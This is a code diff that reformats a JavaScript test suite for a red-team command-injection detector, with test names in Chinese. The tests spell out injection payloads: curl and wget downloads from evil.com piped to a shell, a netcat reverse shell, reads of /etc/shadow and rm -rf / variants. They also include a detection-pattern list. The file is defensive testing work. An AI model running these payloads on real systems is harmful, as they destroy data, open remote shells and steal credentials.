@@ -1,9 +1,9 @@
 import {
-  setupStrictTestEnvironment,
+  createDetailedErrorReporter,
   createStrictTestCleanup,
+  setupStrictTestEnvironment,
   strictAssert,
   withTimeout,
-  createDetailedErrorReporter
 } from '../test-helpers.js';
 
 /**
@@ -11,10 +11,10 @@ import {
  * 模拟各种命令注入攻击向量
  */
 
-import { describe, it, expect, beforeEach, afterEach } from 'vitest';
-import RedTeamFramework, { AttackVectors } from './red-team-framework.js';
 import { exec, execSync } from 'child_process';
 import { promisify } from 'util';
+import { afterEach, beforeEach, describe, expect, it } from 'vitest';
+import RedTeamFramework, { AttackVectors } from './red-team-framework.js';
 
 const execAsync = promisify(exec);
 
@@ -39,8 +39,8 @@ describe('命令注入攻击测试', () => {
               command: command,
               detected: true,
               injectionType: payload.injectionType,
-              input: payload.input
-            }
+              input: payload.input,
+            },
           };
         }
 
@@ -54,8 +54,8 @@ describe('命令注入攻击测试', () => {
             command: command,
             result: result,
             detected: false,
-            safe: true
-          }
+            safe: true,
+          },
         };
       } catch (error) {
         return {
@@ -64,8 +64,8 @@ describe('命令注入攻击测试', () => {
           details: {
             error: error.message,
             command: payload.command,
-            safe: false
-          }
+            safe: false,
+          },
         };
       }
     });
@@ -123,10 +123,10 @@ describe('命令注入攻击测试', () => {
       /python\s+-c/,
       /perl\s+-e/,
       /php\s+-r/,
-      /node\s+-e/
+      /node\s+-e/,
     ];
 
-    return injectionPatterns.some(pattern => pattern.test(input));
+    return injectionPatterns.some((pattern) => pattern.test(input));
   }
 
   // 安全执行命令（模拟）
@@ -141,7 +141,7 @@ describe('命令注入攻击测试', () => {
     return {
       stdout: 'Command executed safely',
       stderr: '',
-      exitCode: 0
+      exitCode: 0,
     };
   }
 
@@ -150,10 +150,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'hello; rm -rf /',
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -164,10 +167,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'hello | cat /etc/passwd',
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -178,10 +184,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'hello $(cat /etc/passwd)',
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -192,10 +201,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'hello `whoami`',
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -208,10 +220,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test && rm -rf /',
         injectionType: 'system',
-        baseCommand: 'ls'
+        baseCommand: 'ls',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -222,10 +237,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test; shutdown -h now',
         injectionType: 'system',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -236,10 +254,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test | reboot',
         injectionType: 'system',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -252,10 +273,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test && wget http://evil.com/malware | sh',
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -266,10 +290,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test; curl http://evil.com/shell | bash',
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -280,10 +307,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test && nc evil.com 4444 -e /bin/sh',
         injectionType: 'system',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -296,10 +326,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test && python -c "import os; os.system(\'rm -rf /\')"',
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -308,12 +341,16 @@ describe('命令注入攻击测试', () => {
 
     it('应该阻止Node.js代码注入', async () => {
       const payload = {
-        input: 'test; node -e "require(\'fs\').rmdirSync(\'/\', {recursive: true})"',
+        input:
+          "test; node -e \"require('fs').rmdirSync('/', {recursive: true})\"",
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -324,10 +361,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test | php -r "system(\'rm -rf /\');"',
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -340,10 +380,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test && rm -rf /home/user/*',
         injectionType: 'system',
-        baseCommand: 'ls'
+        baseCommand: 'ls',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -354,10 +397,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test > /etc/passwd',
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -368,10 +414,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test && cat /etc/shadow',
         injectionType: 'system',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -384,10 +433,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test&&rm -rf /',
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -398,10 +450,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test\t&&\trm\t-rf\t/',
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -412,10 +467,13 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test\nrm -rf /',
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
 
       expect(result.blocked).toBe(true);
       expect(result.success).toBe(true);
@@ -427,19 +485,40 @@ describe('命令注入攻击测试', () => {
     const injectionPayloads = [
       { input: 'test; rm -rf /', injectionType: 'shell_exec' },
       { input: 'test && shutdown -h now', injectionType: 'system' },
-      { input: 'test | nc evil.com 4444 -e /bin/sh', injectionType: 'shell_exec' },
-      { input: 'test && wget http://evil.com/shell | sh', injectionType: 'system' },
-      { input: 'test; python -c "import os; os.system(\'rm -rf /\')"', injectionType: 'shell_exec' },
-      { input: 'test && node -e "require(\'fs\').rmdirSync(\'/\')"', injectionType: 'system' },
-      { input: 'test | php -r "system(\'rm -rf /\');"', injectionType: 'shell_exec' },
-      { input: 'test && curl http://evil.com/malware | bash', injectionType: 'system' },
+      {
+        input: 'test | nc evil.com 4444 -e /bin/sh',
+        injectionType: 'shell_exec',
+      },
+      {
+        input: 'test && wget http://evil.com/shell | sh',
+        injectionType: 'system',
+      },
+      {
+        input: 'test; python -c "import os; os.system(\'rm -rf /\')"',
+        injectionType: 'shell_exec',
+      },
+      {
+        input: "test && node -e \"require('fs').rmdirSync('/')\"",
+        injectionType: 'system',
+      },
+      {
+        input: 'test | php -r "system(\'rm -rf /\');"',
+        injectionType: 'shell_exec',
+      },
+      {
+        input: 'test && curl http://evil.com/malware | bash',
+        injectionType: 'system',
+      },
       { input: 'test; format c:', injectionType: 'shell_exec' },
-      { input: 'test && del *.* /s /q', injectionType: 'system' }
+      { input: 'test && del *.* /s /q', injectionType: 'system' },
     ];
 
     it.each(injectionPayloads)('应该检测到命令注入: %j', async (payload) => {
       const fullPayload = { ...payload, baseCommand: 'echo' };
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, fullPayload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        fullPayload,
+      );
 
       expect(result.success).toBe(true);
       expect(result.details.detected).toBe(true);
@@ -451,11 +530,14 @@ describe('命令注入攻击测试', () => {
       const payload = {
         input: 'test; rm -rf /',
         injectionType: 'shell_exec',
-        baseCommand: 'echo'
+        baseCommand: 'echo',
       };
 
       const startTime = performance.now();
-      const result = await redTeam.executeAttack(AttackVectors.COMMAND_INJECTION, payload);
+      const result = await redTeam.executeAttack(
+        AttackVectors.COMMAND_INJECTION,
+        payload,
+      );
       const endTime = performance.now();
 
       expect(result.success).toBe(true);
